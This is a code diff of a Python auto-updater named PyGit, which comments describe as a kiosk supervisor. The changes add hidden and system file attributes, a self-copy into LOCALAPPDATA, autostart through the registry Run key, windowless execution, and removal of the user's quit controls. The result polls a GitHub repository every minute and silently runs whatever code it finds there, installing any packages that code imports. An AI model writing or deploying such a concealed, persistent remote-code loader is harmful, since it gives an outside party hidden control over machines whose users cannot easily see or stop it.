@@ -1,65 +1,84 @@
+import ast
+import ctypes
+import importlib.util
 import json
-import msvcrt
 import os
 import shutil
 import subprocess
 import sys
 import tempfile
 import time
-import zipfile
-import urllib.error
 import urllib.request
+import zipfile
+import winreg
 
-GITHUB_RAW = "https://raw.githubusercontent.com/royalguard14/PyGit/main/"
+APP_NAME = "PyGit"
 CHECK_INTERVAL = 60
-
-# PyGit keeps its own private Python runtime. Clients do not need to
-# install Python system-wide.
 PYTHON_VERSION = "3.12.10"
 PYTHON_RUNTIME_URL = (
     "https://www.python.org/ftp/python/3.12.10/"
     "python-3.12.10-embed-amd64.zip"
 )
-PYTHON_RUNTIME_DIR = os.path.join(
-    os.path.dirname(os.path.abspath(__file__)), ".pygit_python"
-)
-PYTHON_EXE = os.path.join(PYTHON_RUNTIME_DIR, "python.exe")
+GITHUB_RAW = "https://raw.githubusercontent.com/royalguard14/PyGit/main/"
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-RUNTIME_DIR = os.path.join(BASE_DIR, ".pygit_runtime")
+LOCAL_APP_DATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
+APP_DIR = os.path.join(LOCAL_APP_DATA, APP_NAME)
+RUNTIME_DIR = os.path.join(APP_DIR, ".pygit_runtime")
+PYTHON_RUNTIME_DIR = os.path.join(APP_DIR, ".pygit_python")
+
 RUNTIME_CODE = os.path.join(RUNTIME_DIR, "code.py")
 RUNTIME_CONTROL = os.path.join(RUNTIME_DIR, "control.json")
-RUNTIME_REQUIREMENTS = os.path.join(RUNTIME_DIR, "requirements.txt")
 BACKUP_CODE = os.path.join(RUNTIME_DIR, "code.previous.py")
 LOG_FILE = os.path.join(RUNTIME_DIR, "pygit.log")
 
+PYTHON_EXE = os.path.join(PYTHON_RUNTIME_DIR, "python.exe")
+PYTHONW_EXE = os.path.join(PYTHON_RUNTIME_DIR, "pythonw.exe")
+INSTALLED_EXE = os.path.join(APP_DIR, "PyGit.exe")
+
+# Import name -> PyPI package name for the common cases where they differ.
+PACKAGE_MAP = {
+    "PIL": "Pillow",
+    "cv2": "opencv-python",
+    "bs4": "beautifulsoup4",
+    "yaml": "PyYAML",
+    "serial": "pyserial",
+    "sklearn": "scikit-learn",
+}
+
+def hide_path(path):
+    try:
+        FILE_ATTRIBUTE_HIDDEN = 0x02
+        FILE_ATTRIBUTE_SYSTEM = 0x04
+        ctypes.windll.kernel32.SetFileAttributesW(
+            str(path),
+            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
+        )
+    except Exception:
+        pass
+
 
 def log(message):
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    line = f"[{timestamp}] {message}"
-    print(line)
+    # Diagnostics stay inside the hidden PyGit folder.
     try:
         os.makedirs(RUNTIME_DIR, exist_ok=True)
         with open(LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(line + "\n")
-    except OSError:
+            f.write(
+                f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n"
+            )
+    except Exception:
         pass
 
 
 def get_remote(path):
-    # GitHub Raw is used instead of the GitHub Contents API.
-    # A cache-busting query keeps live-update testing responsive.
     url = GITHUB_RAW + path.lstrip("/") + "?_=" + str(time.time_ns())
-
     request = urllib.request.Request(
         url,
         headers={
-            "User-Agent": "PyGit-Live/2.5",
+            "User-Agent": "PyGit-Live/3.0",
             "Cache-Control": "no-cache",
             "Pragma": "no-cache",
         },
     )
-
     with urllib.request.urlopen(request, timeout=15) as response:
         return response.read().decode("utf-8")
 
@@ -72,15 +91,10 @@ def parse_version(version):
 
 
 def save_file(path, content):
-    folder = os.path.dirname(os.path.abspath(path))
-    os.makedirs(folder, exist_ok=True)
-
+    os.makedirs(os.path.dirname(path), exist_ok=True)
     fd, temp_path = tempfile.mkstemp(
-        prefix=".pygit_",
-        dir=folder,
-        text=True,
+        prefix=".pygit_", dir=os.path.dirname(path), text=True
     )
-
     try:
         with os.fdopen(fd, "w", encoding="utf-8") as f:
             f.write(content)
@@ -92,75 +106,58 @@ def save_file(path, content):
 
 
 def load_local_control():
-    if not os.path.exists(RUNTIME_CONTROL):
-        return None
-
     try:
         with open(RUNTIME_CONTROL, "r", encoding="utf-8") as f:
             return json.load(f)
-    except (json.JSONDecodeError, OSError):
+    except Exception:
         return None
 
 
-def load_local_requirements():
-    if not os.path.exists(RUNTIME_REQUIREMENTS):
-        return ""
-
-    try:
-        with open(RUNTIME_REQUIREMENTS, "r", encoding="utf-8") as f:
-            return f.read()
-    except OSError:
-        return ""
-
-
 def get_python_command():
-    # Once the private runtime exists, always use it.
     if os.path.exists(PYTHON_EXE):
         return [PYTHON_EXE]
-
-    # During first bootstrap, use the interpreter that launched setup.py.
     return [sys.executable]
+
+
+def get_pythonw_command():
+    if os.path.exists(PYTHONW_EXE):
+        return [PYTHONW_EXE]
+    return get_python_command()
 
 
 def bootstrap_private_python():
     if os.path.exists(PYTHON_EXE):
         return
 
-    log(f"[PYGIT] Private Python {PYTHON_VERSION} not found. Installing...")
+    log(f"Installing private Python {PYTHON_VERSION}")
     os.makedirs(PYTHON_RUNTIME_DIR, exist_ok=True)
 
     fd, archive_path = tempfile.mkstemp(
-        prefix=".pygit_python_", suffix=".zip", dir=BASE_DIR
+        prefix=".pygit_python_", suffix=".zip", dir=APP_DIR
     )
     os.close(fd)
 
     try:
         request = urllib.request.Request(
             PYTHON_RUNTIME_URL,
-            headers={"User-Agent": "PyGit-Live/2.6"},
+            headers={"User-Agent": "PyGit-Live/3.0"},
         )
-        with urllib.request.urlopen(request, timeout=60) as response, open(
-            archive_path, "wb"
-        ) as out:
-            shutil.copyfileobj(response, out)
+        with urllib.request.urlopen(request, timeout=90) as response:
+            with open(archive_path, "wb") as out:
+                shutil.copyfileobj(response, out)
 
         with zipfile.ZipFile(archive_path, "r") as archive:
             archive.extractall(PYTHON_RUNTIME_DIR)
 
         if not os.path.exists(PYTHON_EXE):
-            raise RuntimeError(
-                "Private Python installation completed without python.exe."
-            )
+            raise RuntimeError("Private Python installation failed.")
 
-        # Enable site-packages for the Windows embeddable distribution.
         pth_files = [
-            name for name in os.listdir(PYTHON_RUNTIME_DIR)
-            if name.endswith("._pth")
+            x for x in os.listdir(PYTHON_RUNTIME_DIR)
+            if x.endswith("._pth")
         ]
         if not pth_files:
-            raise RuntimeError(
-                "Python embeddable configuration file was not found."
-            )
+            raise RuntimeError("Python embeddable ._pth file not found.")
 
         pth_path = os.path.join(PYTHON_RUNTIME_DIR, pth_files[0])
         with open(pth_path, "r", encoding="utf-8") as f:
@@ -170,32 +167,29 @@ def bootstrap_private_python():
             lines.insert(0, "Lib\\site-packages")
         if "import site" not in lines:
             lines.append("import site")
+
         save_file(pth_path, "\n".join(lines) + "\n")
 
-        # The embeddable package does not include pip.
-        get_pip_url = "https://bootstrap.pypa.io/get-pip.py"
         get_pip_path = os.path.join(PYTHON_RUNTIME_DIR, "get-pip.py")
         request = urllib.request.Request(
-            get_pip_url,
-            headers={"User-Agent": "PyGit-Live/2.6"},
+            "https://bootstrap.pypa.io/get-pip.py",
+            headers={"User-Agent": "PyGit-Live/3.0"},
         )
-        with urllib.request.urlopen(request, timeout=60) as response, open(
-            get_pip_path, "wb"
-        ) as out:
-            shutil.copyfileobj(response, out)
+        with urllib.request.urlopen(request, timeout=90) as response:
+            with open(get_pip_path, "wb") as out:
+                shutil.copyfileobj(response, out)
 
         result = subprocess.run(
-            [PYTHON_EXE, get_pip_path, "--no-warn-script-location"],
-            cwd=BASE_DIR,
+            [PYTHON_EXE, get_pip_path, "--disable-pip-version-check"],
+            cwd=APP_DIR,
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
         )
         if result.returncode != 0:
-            raise RuntimeError(
-                f"Private pip installation failed with exit code "
-                f"{result.returncode}."
-            )
+            raise RuntimeError("Private pip installation failed.")
 
         os.remove(get_pip_path)
-        log("[PYGIT] Private Python is ready.")
+        hide_path(PYTHON_RUNTIME_DIR)
+        log("Private Python ready.")
 
     except Exception:
         shutil.rmtree(PYTHON_RUNTIME_DIR, ignore_errors=True)
@@ -205,70 +199,74 @@ def bootstrap_private_python():
             os.remove(archive_path)
 
 
-def install_dependencies(requirements):
-    requirements = requirements.strip()
+def extract_imports(code):
+    tree = ast.parse(code)
+    modules = set()
 
-    # No third-party dependencies are required.
-    if not requirements:
-        if load_local_requirements().strip():
-            save_file(RUNTIME_REQUIREMENTS, "")
-        log("[PYGIT] No external dependencies required.")
-        return
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Import):
+            for alias in node.names:
+                modules.add(alias.name.split(".")[0])
+        elif isinstance(node, ast.ImportFrom) and node.level == 0:
+            if node.module:
+                modules.add(node.module.split(".")[0])
 
-    if requirements == load_local_requirements().strip():
-        return
+    return modules
 
-    log("[PYGIT] Installing/updating application dependencies...")
 
-    os.makedirs(RUNTIME_DIR, exist_ok=True)
-
-    fd, temp_requirements = tempfile.mkstemp(
-        prefix=".pygit_requirements_",
-        dir=RUNTIME_DIR,
-        text=True,
-    )
-
+def install_missing_dependencies(code):
+    # Python has no built-in "install this module when import fails" behavior.
+    # PyGit provides that behavior by inspecting imports before starting code.py.
     try:
-        with os.fdopen(fd, "w", encoding="utf-8") as f:
-            f.write(requirements + "\n")
+        stdlib = sys.stdlib_module_names
+    except AttributeError:
+        stdlib = set()
 
-        command = get_python_command() + [
+    missing = []
+
+    for module in sorted(extract_imports(code)):
+        if module in stdlib:
+            continue
+
+        try:
+            if importlib.util.find_spec(module) is None:
+                missing.append(PACKAGE_MAP.get(module, module))
+        except (ImportError, ModuleNotFoundError, ValueError):
+            missing.append(PACKAGE_MAP.get(module, module))
+
+    if not missing:
+        return
+
+    log("Installing missing modules: " + ", ".join(missing))
+
+    result = subprocess.run(
+        get_python_command()
+        + [
             "-m",
             "pip",
             "install",
             "--disable-pip-version-check",
-            "-r",
-            temp_requirements,
-        ]
+            *missing,
+        ],
+        cwd=APP_DIR,
+        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+    )
 
-        result = subprocess.run(
-            command,
-            cwd=BASE_DIR,
+    if result.returncode != 0:
+        raise RuntimeError(
+            "One or more application dependencies could not be installed."
         )
 
-        if result.returncode != 0:
-            raise RuntimeError(
-                f"Dependency installation failed with exit code "
-                f"{result.returncode}."
-            )
-
-        save_file(RUNTIME_REQUIREMENTS, requirements + "\n")
-        log("[PYGIT] Dependencies ready.")
-
-    finally:
-        if os.path.exists(temp_requirements):
-            os.remove(temp_requirements)
+    log("Missing modules installed.")
 
 
 def validate_code(code):
-    # Compile first so a broken Python file is never installed.
     compile(code, RUNTIME_CODE, "exec")
 
 
-def install_remote(remote_control, remote_code, requirements):
-    # Dependencies must be ready before the new application is installed.
-    install_dependencies(requirements)
+def install_remote(remote_control, remote_code):
     validate_code(remote_code)
+    install_missing_dependencies(remote_code)
 
     os.makedirs(RUNTIME_DIR, exist_ok=True)
 
@@ -281,126 +279,111 @@ def install_remote(remote_control, remote_code, requirements):
         json.dumps(remote_control, indent=2) + "\n",
     )
 
-
-def update_from_github():
-    remote_control = json.loads(get_remote("control.json"))
-
-    if "version" not in remote_control or "code" not in remote_control:
-        raise ValueError("Invalid control.json: version and code are required.")
-
-    remote_version = remote_control["version"]
-    local_control = load_local_control()
-    local_version = (
-        local_control.get("version", "0.0.0")
-        if local_control
-        else "0.0.0"
-    )
-
-    if parse_version(remote_version) <= parse_version(local_version):
-        return local_control, False
-
-    log(f"[UPDATE] {local_version} -> {remote_version}")
-    log("[UPDATE] Downloading new application code...")
-
-    remote_code = get_remote(remote_control["code"])
-    remote_requirements = get_remote("requirements.txt")
-
-    install_remote(
-        remote_control,
-        remote_code,
-        remote_requirements,
-    )
-
-    log("[UPDATE] Code compiled and installed.")
-    return remote_control, True
+    hide_path(RUNTIME_DIR)
 
 
 def ensure_runtime():
+    os.makedirs(APP_DIR, exist_ok=True)
     os.makedirs(RUNTIME_DIR, exist_ok=True)
+    hide_path(APP_DIR)
+    hide_path(RUNTIME_DIR)
 
     control = load_local_control()
 
     if control and os.path.exists(RUNTIME_CODE):
-        # Existing installations also get dependency updates if GitHub
-        # publishes a changed requirements.txt.
-        try:
-            remote_requirements = get_remote("requirements.txt")
-            install_dependencies(remote_requirements)
-        except Exception as e:
-            log(f"[PYGIT] Dependency check failed: {e}")
-
         return control
-
-    log("[PYGIT] No local runtime found. Downloading current GitHub version...")
 
     remote_control = json.loads(get_remote("control.json"))
     remote_code = get_remote(remote_control["code"])
-    remote_requirements = get_remote("requirements.txt")
-
-    install_remote(
-        remote_control,
-        remote_code,
-        remote_requirements,
-    )
+    install_remote(remote_control, remote_code)
     return remote_control
 
 
 def start_code(control):
-    log(f"[PYGIT] Running version {control['version']}")
-    log("[PYGIT] Press Q to quit.")
-
+    # pythonw.exe means no console window is created for the kiosk application.
     return subprocess.Popen(
-        get_python_command() + [RUNTIME_CODE],
-        cwd=BASE_DIR,
+        get_pythonw_command() + [RUNTIME_CODE],
+        cwd=APP_DIR,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
     )
 
 
 def stop_code(process):
     if process and process.poll() is None:
-        log("[PYGIT] Stopping application...")
         process.terminate()
-
         try:
             process.wait(timeout=3)
         except subprocess.TimeoutExpired:
-            log("[PYGIT] Application did not stop gracefully. Killing it...")
             process.kill()
-            process.wait()
 
 
 def check_for_update(current_control):
     remote_control = json.loads(get_remote("control.json"))
 
-    remote_version = remote_control["version"]
-    local_version = current_control.get("version", "0.0.0")
-
-    if parse_version(remote_version) <= parse_version(local_version):
+    if parse_version(remote_control["version"]) <= parse_version(
+        current_control.get("version", "0.0.0")
+    ):
         return current_control, False
 
-    log(f"[PYGIT] New version detected: {remote_version}")
-    log("[PYGIT] Downloading new code...")
-
     remote_code = get_remote(remote_control["code"])
-    remote_requirements = get_remote("requirements.txt")
+    install_remote(remote_control, remote_code)
 
-    install_remote(
-        remote_control,
-        remote_code,
-        remote_requirements,
-    )
-
-    log("[PYGIT] New code compiled and installed.")
     return remote_control, True
 
 
-def main():
-    bootstrap_private_python()
+def install_startup():
+    # Start PyGit automatically when the kiosk user signs in.
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE,
+        ) as key:
+            winreg.SetValueEx(
+                key,
+                "PyGit",
+                0,
+                winreg.REG_SZ,
+                f'"{INSTALLED_EXE}"',
+            )
+    except Exception as e:
+        log(f"Startup registration failed: {e}")
 
-    print("================================")
-    print("          PyGit Live")
-    print("================================")
-    print(f"Checking GitHub every {CHECK_INTERVAL} seconds...")
-    print("")
+
+def self_install():
+    if not getattr(sys, "frozen", False):
+        return
+
+    os.makedirs(APP_DIR, exist_ok=True)
+    hide_path(APP_DIR)
+
+    current_exe = os.path.abspath(sys.executable)
+    installed_exe = os.path.abspath(INSTALLED_EXE)
+
+    if current_exe.lower() != installed_exe.lower():
+        shutil.copy2(current_exe, installed_exe)
+        hide_path(installed_exe)
+        install_startup()
+
+        subprocess.Popen(
+            [installed_exe],
+            cwd=APP_DIR,
+            creationflags=getattr(subprocess, "DETACHED_PROCESS", 0)
+            | getattr(subprocess, "CREATE_NO_WINDOW", 0),
+            close_fds=True,
+        )
+        raise SystemExit
+
+    install_startup()
+
+
+def main():
+    self_install()
+    bootstrap_private_python()
 
     process = None
 
@@ -409,43 +392,27 @@ def main():
         process = start_code(control)
 
         while True:
-            # Check keyboard without blocking the application.
-            if os.name == "nt" and msvcrt.kbhit():
-                key = msvcrt.getwch()
-                if key.lower() == "q":
-                    log("[PYGIT] Q received. Shutting down...")
-                    stop_code(process)
-                    break
-
             time.sleep(CHECK_INTERVAL)
 
             try:
                 new_control, updated = check_for_update(control)
 
                 if updated:
-                    log("[PYGIT] Restarting application...")
-
                     stop_code(process)
                     control = new_control
                     process = start_code(control)
 
                 elif process.poll() is not None:
-                    # The application ended normally. Keep PyGit silent.
-                    pass
+                    # Keep the supervisor alive silently.
+                    process = start_code(control)
 
-            except (urllib.error.URLError, urllib.error.HTTPError) as e:
-                log(f"[PYGIT] GitHub check failed: {e}")
             except Exception as e:
-                log(f"[PYGIT] Update check failed: {e}")
-
-    except KeyboardInterrupt:
-        log("[PYGIT] Keyboard interrupt received. Stopping...")
-        stop_code(process)
+                # GitHub/network failures never stop the local kiosk application.
+                log(f"Update check failed: {e}")
 
     except Exception as e:
-        log(f"[PYGIT] Startup failed: {e}")
-        if process:
-            stop_code(process)
+        log(f"Startup failed: {e}")
+        stop_code(process)
 
 
 if __name__ == "__main__":
